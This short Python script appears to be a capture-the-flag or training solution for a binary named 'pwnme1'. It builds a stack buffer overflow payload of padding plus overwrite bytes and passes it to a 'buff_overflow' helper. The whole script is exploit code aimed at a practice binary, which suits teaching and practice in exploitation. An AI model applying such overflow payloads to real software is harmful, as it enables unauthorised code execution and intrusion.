from templates import buff_overflow

def main():
    payload = b"a" * (0x70 + 8) + b"\xBE\xB4\x00\x00" + b"\x47\x7B\xF4"
    fail_str = "Summer school 4 u?"

    buff_overflow(payload, fail_str=fail_str, elf="./pwnme1")


main()
